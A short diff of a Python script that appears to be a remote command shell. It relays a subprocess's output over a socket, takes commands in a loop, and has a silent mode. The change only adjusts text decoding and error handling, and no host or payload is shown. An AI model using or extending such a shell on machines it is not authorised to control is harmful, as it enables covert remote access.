@@ -23,8 +23,13 @@ def response(target: socket.socket, process: subprocess.Popen) -> None:
         target.send(data)
 
         if not silentMode:
-            sys.stdout.write(data.decode())
-            sys.stdout.flush()
+            try:
+                sys.stdout.write(data.decode("UTF-8"))
+                sys.stdout.flush()
+            except UnicodeDecodeError:
+                pass
+            except Exception as e:
+                if not silentMode: print(f"[!] (response) exception: {e}")
 
 def sendcommand(process: subprocess.Popen, command):
     try:
@@ -57,7 +62,7 @@ if __name__ == "__main__":
     while True:
         try:
             data = targetSock.recv(1024)
-            dataRecv = data.decode()
+            dataRecv = data.decode("UTF16")
             if dataRecv != "":
                 if dataRecv == "stop" or dataRecv == "exit" or dataRecv == "quit":
                     flag = False
